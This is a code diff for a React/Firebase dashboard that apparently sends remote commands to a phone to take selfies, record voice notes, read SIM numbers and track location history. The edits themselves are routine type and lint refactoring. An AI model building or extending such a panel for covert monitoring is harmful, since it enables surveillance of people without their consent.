@@ -1,23 +1,26 @@
 import React, { useEffect, useState, useRef } from "react";
+import type { ReactElement } from "react";
 import { database } from '../firebase/config';
 import { ref, push, set, onValue, off } from 'firebase/database';
 
-// Enum for server commands
-enum ServerCommands {
-  TakeSelfie = 'TakeSelfie',
-  GetVoiceNote = 'GetVoiceNote',
-  GetSimNumbers = 'GetSimNumbers',
-  GetLocation = 'GetLocation',
-  GetLocationTimeline = 'GetLocationTimeline',
-  SendNotification = 'SendNotification',
-}
+// Server Commands as a union type and object
+export const ServerCommands = {
+  TakeSelfie: 'TakeSelfie',
+  GetVoiceNote: 'GetVoiceNote',
+  GetSimNumbers: 'GetSimNumbers',
+  GetLocation: 'GetLocation',
+  GetLocationTimeline: 'GetLocationTimeline',
+  SendNotification: 'SendNotification',
+} as const;
+export type ServerCommands = typeof ServerCommands[keyof typeof ServerCommands];
 
-// Enum for command status
-enum MessageStatus {
-  BEFORE_UPLOADED = 'BEFORE_UPLOADED',
-  UPLOADED = 'UPLOADED',
-  DELIVERED = 'DELIVERED',
-}
+// Message Status as a union type and object
+export const MessageStatus = {
+  BEFORE_UPLOADED: 'BEFORE_UPLOADED',
+  UPLOADED: 'UPLOADED',
+  DELIVERED: 'DELIVERED',
+} as const;
+export type MessageStatus = typeof MessageStatus[keyof typeof MessageStatus];
 const STATUS = MessageStatus; // alias for brevity
 
 // Helper to detect Firebase Storage media URLs
@@ -386,7 +389,7 @@ const TopMenuBar: React.FC<{
 );
 
 // Icon map for commands
-const commandIcons: Record<string, JSX.Element> = {
+const commandIcons: Record<string, ReactElement> = {
   "Get Location": <span className="mr-2 text-blue-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 11c1.104 0 2-.896 2-2s-.896-2-2-2-2 .896-2 2 .896 2 2 2zm0 10c-4.418 0-8-3.582-8-8 0-4.418 3.582-8 8-8s8 3.582 8 8c0 4.418-3.582 8-8 8zm0 0V3"/></svg></span>,
   "Take Selfie": <span className="mr-2 text-pink-500"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><rect width="20" height="14" x="2" y="5" rx="2"/><circle cx="12" cy="12" r="3"/></svg></span>,
   "Get Phone Numbers": <span className="mr-2 text-green-600"><svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M3 5a2 2 0 012-2h3.28a2 2 0 011.94 1.515l.518 2.073a2 2 0 01-.45 1.94l-1.07 1.07a16.001 16.001 0 006.586 6.586l1.07-1.07a2 2 0 011.94-.45l2.073.518A2 2 0 0121 17.72V21a2 2 0 01-2 2h-1C9.163 23 1 14.837 1 5V4a2 2 0 012-2z"/></svg></span>,
@@ -479,18 +482,18 @@ const Dashboard: React.FC = () => {
   const chatEndRef = useRef<HTMLDivElement | null>(null);
   const [isDeviceInfoOpenOnMobile, setIsDeviceInfoOpenOnMobile] = useState(false);
   // const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false); // Removed duplicate
-  const [showCommandMenu, setShowCommandMenu] = useState(false);
+
 
   // Toggle command menu
-  const toggleCommandMenu = () => {
-    setShowCommandMenu(!showCommandMenu);
-  };
+  // Removed unused toggleCommandMenu to fix lint/build error
+  // (function and body removed)
+
 
   // Handle command selection from mobile menu or bottom nav
   const handleCommandSelect = (command: ServerCommands | null) => {
     if (command) {
       sendCommand(command);
-      setShowCommandMenu(false);
+      // Command menu removed, so only close mobile menu
       setIsMobileMenuOpen(false);
     }
   };
